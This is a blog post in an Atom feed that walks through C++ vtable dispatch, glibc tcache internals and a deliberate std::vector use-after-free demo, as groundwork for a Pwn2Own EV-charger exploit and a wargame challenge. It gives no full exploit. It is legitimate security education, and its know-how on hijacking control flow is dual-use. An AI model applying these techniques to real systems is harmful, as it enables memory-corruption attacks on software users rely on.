<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-09-01T21:36:21-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">halcyondream</title><subtitle>Portfolio for Cybersecurity projects, research, and developments.</subtitle><entry><title type="html">Analyzing C++ Compiler Vulnerabilities</title><link href="http://localhost:4000/2025/09/01/analyzing-cplusplus-compiler-vulnerabilities.html" rel="alternate" type="text/html" title="Analyzing C++ Compiler Vulnerabilities" /><published>2025-09-01T00:00:00-04:00</published><updated>2025-09-01T00:00:00-04:00</updated><id>http://localhost:4000/2025/09/01/analyzing-cplusplus-compiler-vulnerabilities</id><content type="html" xml:base="http://localhost:4000/2025/09/01/analyzing-cplusplus-compiler-vulnerabilities.html">&lt;p&gt;Ret2 did a &lt;a href=&quot;https://blog.ret2.io/2024/07/17/pwn2own-auto-2024-charx-bugs/&quot;&gt;two-part writeup about a pwn2own 2024 challenge&lt;/a&gt;, where they exploited an electrical vehicle charging station: the CHARX SEC-3100. Both the solution and the &lt;a href=&quot;https://www.phoenixcontact.com/en-us/products/ac-charging-controller-charx-sec-3100-1139012#downloads-link-target&quot;&gt;firmware (which is not encrypted)&lt;/a&gt; are available online at this time. The firmware is 32-bit ARM and runs in a Linux environment, and the updates are all squashfs’ed, ready to be flashed or unpacked. Their exploit relied on a use-after-free vulnerability, coupled with some interesting side effects from both the code and the standard library version used.&lt;/p&gt;

&lt;p&gt;To accompany the Pwn2Own writeups, they also provide a &lt;a href=&quot;https://wargames.ret2.systems/level/charxpost_destructors&quot;&gt;public challenge&lt;/a&gt;, which is part of their wargames platform. To demonstrate the use-after-free vulnerability specifically, they &lt;em&gt;also&lt;/em&gt; provide some toy code in the first of the two writeups. Both the challenge and the toy code have the same UAF bug, which is triggered by the outer class’ destructor on exit.&lt;/p&gt;

&lt;p&gt;I wanted to do a deeper dive into the conditions that lead to exploitation in both the toy code example and the Wargames challenge code. The reader is left to solve the Wargames challenge on their own. The intention here is to walk through some C++ and GCC foundations to understand the problems they introduced and how they work together on the path to exploitation.&lt;/p&gt;

&lt;p&gt;In particular, the analysis is broken up into a few different parts, most of which were addressed by the two writeups on the EV challenge:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Understanding the role of &lt;a href=&quot;https://en.cppreference.com/w/cpp/language/virtual.html&quot;&gt;C++ virtual functions&lt;/a&gt; (and how to spot them)&lt;/li&gt;
  &lt;li&gt;Tracing what &lt;em&gt;free&lt;/em&gt;‘d elements look like in &lt;a href=&quot;https://sourceware.org/glibc/wiki/MallocInternals&quot;&gt;glibc’s tcache&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Seeing how an older glibc standard affects code compilation and execution&lt;/li&gt;
  &lt;li&gt;Leveraging the placement of virtual functions in the &lt;a href=&quot;https://en.wikipedia.org/wiki/Virtual_method_table&quot;&gt;vtable&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Each section contains a quote from the second writeup which explains where my thinking was during exploitation. The intention is to bridge key concepts from the writeup with corresponding behaviors in the Wargames challenge.&lt;/p&gt;

&lt;p&gt;This writeup mostly focuses on how the C++ code compiles. Those understandings are really the key to solving the challenge.&lt;/p&gt;
&lt;h1 id=&quot;virtual-functions&quot;&gt;Virtual Functions&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;Assuming we can control a node along this traversal, we can easily hijack control flow with the virtual call to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get_connection_id&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Abusing virtual functions to hijack control flow is an interesting side effect of how virtual functions compile.&lt;/p&gt;

&lt;p&gt;As a base case, let’s consider the following code:&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Item&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;public:&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We will implement every version of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Item::foo&lt;/code&gt; with an innocuous definition:&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Item&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;foo&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then, call it inside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;Item&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can compile it with debugging flags for clarity:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc -g demo.cpp -o demo
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then disassemble &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) set print asm-demangle on

(gdb) disas main
Dump of assembler code for function main():
   0x000000000000113a &amp;lt;+0&amp;gt;:     push   rbp
   0x000000000000113b &amp;lt;+1&amp;gt;:     mov    rbp,rsp
   0x000000000000113e &amp;lt;+4&amp;gt;:     sub    rsp,0x10
   0x0000000000001142 &amp;lt;+8&amp;gt;:     lea    rax,[rbp-0x1]
   0x0000000000001146 &amp;lt;+12&amp;gt;:    mov    rdi,rax
   0x0000000000001149 &amp;lt;+15&amp;gt;:    call   0x1156 &amp;lt;Item::foo()&amp;gt;
   0x000000000000114e &amp;lt;+20&amp;gt;:    mov    eax,0x0
   0x0000000000001153 &amp;lt;+25&amp;gt;:    leave
   0x0000000000001154 &amp;lt;+26&amp;gt;:    ret
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Item::foo&lt;/code&gt; compiles to its own function. Even if you compile it without the label, the invocation still calls a fixed offset.&lt;/p&gt;

&lt;p&gt;Now, let’s only modify the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Item&lt;/code&gt; class to make &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;foo&lt;/code&gt; virtual:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;class Item {
public:
  virtual void foo();
};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can compile with debugging flags again and disassemble main:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) disas main
Dump of assembler code for function main():
   &amp;lt;+0&amp;gt;:     push   rbp
   &amp;lt;+1&amp;gt;:     mov    rbp,rsp
   &amp;lt;+4&amp;gt;:     sub    rsp,0x10
   &amp;lt;+8&amp;gt;:     lea    rax,[rip+0x2c6f]  # 0x3db8 &amp;lt;vtable for Item+16&amp;gt;
   &amp;lt;+15&amp;gt;:    mov    QWORD PTR [rbp-0x8],rax
   &amp;lt;+19&amp;gt;:    lea    rax,[rbp-0x8]
   &amp;lt;+23&amp;gt;:    mov    rdi,rax
   &amp;lt;+26&amp;gt;:    call   0x1160 &amp;lt;Item::foo()&amp;gt;
   &amp;lt;+31&amp;gt;:    mov    eax,0x0
   &amp;lt;+36&amp;gt;:    leave
   &amp;lt;+37&amp;gt;:    ret
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here, too, it compiles to a function at some fixed offset.&lt;/p&gt;

&lt;p&gt;Recall that in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt;, we use an instance of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Item&lt;/code&gt;. Let’s refactor it to use a pointer instead:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int main() {
  Item *item_ptr = new Item{};
  item_ptr-&amp;gt;foo();
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Notice how the invocation changes:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dump of assembler code for function main():
   0x000000000000115a &amp;lt;+0&amp;gt;:     push   rbp
   0x000000000000115b &amp;lt;+1&amp;gt;:     mov    rbp,rsp
   0x000000000000115e &amp;lt;+4&amp;gt;:     push   rbx
   0x000000000000115f &amp;lt;+5&amp;gt;:     sub    rsp,0x18
   0x0000000000001163 &amp;lt;+9&amp;gt;:     mov    edi,0x8
   0x0000000000001168 &amp;lt;+14&amp;gt;:    call   0x1030 &amp;lt;operator new(unsigned long)@plt&amp;gt;
   0x000000000000116d &amp;lt;+19&amp;gt;:    mov    rbx,rax
   0x0000000000001170 &amp;lt;+22&amp;gt;:    mov    QWORD PTR [rbx],0x0
   0x0000000000001177 &amp;lt;+29&amp;gt;:    mov    rdi,rbx
   0x000000000000117a &amp;lt;+32&amp;gt;:    call   0x11d6 &amp;lt;Item::Item()&amp;gt;
   0x000000000000117f &amp;lt;+37&amp;gt;:    mov    eax,0x0
   0x0000000000001184 &amp;lt;+42&amp;gt;:    mov    QWORD PTR [rbp-0x18],rbx
   0x0000000000001188 &amp;lt;+46&amp;gt;:    test   al,al
   0x000000000000118a &amp;lt;+48&amp;gt;:    je     0x1199 &amp;lt;main()+63&amp;gt;
   0x000000000000118c &amp;lt;+50&amp;gt;:    mov    esi,0x8
   0x0000000000001191 &amp;lt;+55&amp;gt;:    mov    rdi,rbx
   0x0000000000001194 &amp;lt;+58&amp;gt;:    call   0x1040 
   0x0000000000001199 &amp;lt;+63&amp;gt;:    mov    rax,QWORD PTR [rbp-0x18]
   0x000000000000119d &amp;lt;+67&amp;gt;:    mov    rax,QWORD PTR [rax]
   0x00000000000011a0 &amp;lt;+70&amp;gt;:    mov    rdx,QWORD PTR [rax]
   0x00000000000011a3 &amp;lt;+73&amp;gt;:    mov    rax,QWORD PTR [rbp-0x18]
   0x00000000000011a7 &amp;lt;+77&amp;gt;:    mov    rdi,rax
   0x00000000000011aa &amp;lt;+80&amp;gt;:    call   rdx
   0x00000000000011ac &amp;lt;+82&amp;gt;:    mov    eax,0x0
   0x00000000000011b1 &amp;lt;+87&amp;gt;:    mov    rbx,QWORD PTR [rbp-0x8]
   0x00000000000011b5 &amp;lt;+91&amp;gt;:    leave
   0x00000000000011b6 &amp;lt;+92&amp;gt;:    ret
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The actual function call is at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main+80&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) b *main+80
(gdb) r

Breakpoint 1, in main () 

(gdb) x/i $pc
=&amp;gt; 0x5555555551aa &amp;lt;main()+80&amp;gt;:  call   rdx
(gdb) ni

foo
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, the virtual function is set up with this chunk of instructions, and invoked with the call to RDX:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   0x0000000000001199 &amp;lt;+63&amp;gt;:    mov    rax,QWORD PTR [rbp-0x18]
   0x000000000000119d &amp;lt;+67&amp;gt;:    mov    rax,QWORD PTR [rax]
   0x00000000000011a0 &amp;lt;+70&amp;gt;:    mov    rdx,QWORD PTR [rax]
   0x00000000000011a3 &amp;lt;+73&amp;gt;:    mov    rax,QWORD PTR [rbp-0x18]
   0x00000000000011a7 &amp;lt;+77&amp;gt;:    mov    rdi,rax
   0x00000000000011aa &amp;lt;+80&amp;gt;:    call   rdx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is conceptually similar to the way function pointers work in standard C. Observe the call to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fptr&lt;/code&gt; is also a call to a register, RDX:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cat fptr.c
#include &amp;lt;stdio.h&amp;gt;

void do_something() {
  printf(&quot;Hello\n&quot;);
}

int main() {
  void (*fptr)() = 0;
  fptr = &amp;amp;do_something;
  fptr();
}

$ objdump --disassemble=main -Mintel fptr
...
&amp;lt;main&amp;gt;:
push   rbp
mov    rbp,rsp
sub    rsp,0x10
mov    QWORD PTR [rbp-0x8],0x0
lea    rax,[rip+...]  # &amp;lt;do_something&amp;gt;
mov    QWORD PTR [rbp-0x8],rax
mov    rdx,QWORD PTR [rbp-0x8]
mov    eax,0x0
call   rdx
mov    eax,0x0
leave
ret
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A major difference, however, is what’s happening behind the scenes. Every virtual function defined in a class will compile a “vtable,” which is a buffer of memory containing offsets to each virtual function. We can illustrate what the vtable dereference chain by annotating the disassembly:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mov    rax, [...]  // *item
mov    rax, [rax]  // item-&amp;gt;vtable
mov    rdx, [rax]  // item-&amp;gt;vtable-&amp;gt;foo
...
call   rdx         // call item-&amp;gt;vtable-&amp;gt;foo()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;An interesting property of vtables is that, because it pulls a function at some offset, adding more virtual functions will usually compile at different offsets, and usually in order (although that’s not always a guarantee). Let’s check this out:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;class Item {
public:
  virtual void bar();
  virtual void foo();
};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can define &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bar&lt;/code&gt; however you want, but we won’t be using it. Compile the code and disassemble it again. Note the change to the virtual call instructions:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mov    rax,QWORD PTR [rbp-0x18]
mov    rax,QWORD PTR [rax]
add    rax,0x8
mov    rdx,QWORD PTR [rax]
...
call   rdx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ADD RAX,0x8&lt;/code&gt; instruction queries the vtable a little differently:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;item-&amp;gt;(vtable+0x8)-&amp;gt;foo()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Item::foo&lt;/code&gt; exists at offset &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x8&lt;/code&gt; in the Item pointer’s vtable.&lt;/p&gt;

&lt;h1 id=&quot;glibcs-tcache&quot;&gt;Glibc’s tcache&lt;/h1&gt;

&lt;blockquote&gt;
  &lt;p&gt;Fully understanding glibc tcache internals isn’t necessary here; it suffices to say that a tcache bin is just a singly-linked list of free chunks of the same size, where the next pointer is placed at offset 0 in the free chunk.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The tcache is a glibc internal mechanism that can be abused in applications using dynamic memory allocation. Over the years, it’s served as the object of a few different exploit classes involving dynamic allocation. This walkthrough will show you how to navigate a use-after-free (UAF) bug which involves a tcache entry and a free’d &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;std::vector&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The tcache was introduced in glibc 2.26 back in 2017. It still plays a major role in the glibc memory allocator today. There is a &lt;a href=&quot;https://www.youtube.com/watch?v=0jHtqqdVv1Y&quot;&gt;great video on tcache behavior&lt;/a&gt; and a &lt;a href=&quot;https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/implementation/tcache/&quot;&gt;good walkthrough on the source code&lt;/a&gt;. We’ll cover some basics and really focus on how they apply to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;std::vector&lt;/code&gt; type.&lt;/p&gt;

&lt;p&gt;Let’s start by exploring the tcache entry. In glibc, a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcache_entry&lt;/code&gt; is both a struct and a typedef of that struct:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcache_entry&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcache_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcache_perthread_struct&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// Avoids double-frees.&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;tcache_entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;std::vector&lt;/code&gt; type is a C++ linked-list which can store arbitrary data types. Under the hood, it involves some dynamic memory allocations. It is the object of a free Ret2 Wargame challenge and is also the focus of discussion here.&lt;/p&gt;

&lt;p&gt;Let’s start with some driver code.&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;inttypes.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;vector&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vector&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;push_back&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;push_back&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;push_back&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;push_back&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;// Print the contents.&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0x%llu 0x%llu 0x%llu 0x%llu&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;// Explicitly destroy the vector.&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vector&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;// Intentionally do a use-after free.&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0x%llu 0x%llu 0x%llu 0x%llu&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This code prints the following:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x3 0x5 0x9 0x13
0x188703 0x5337669691617803236 0x9 0x13
free(): double free detected in tcache 2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The first row is what we, the developer, expected. The second row is the consequence of using the vector after a &lt;em&gt;free&lt;/em&gt; operation. There’s two important dimensions here:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The elements at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;v[0]&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;v[1]&lt;/code&gt; represent data from a tcache entry&lt;/li&gt;
  &lt;li&gt;The “double free” error implies that deleting a vector involves some dynamic memory allocation and deallocation&lt;/li&gt;
&lt;/ul&gt;

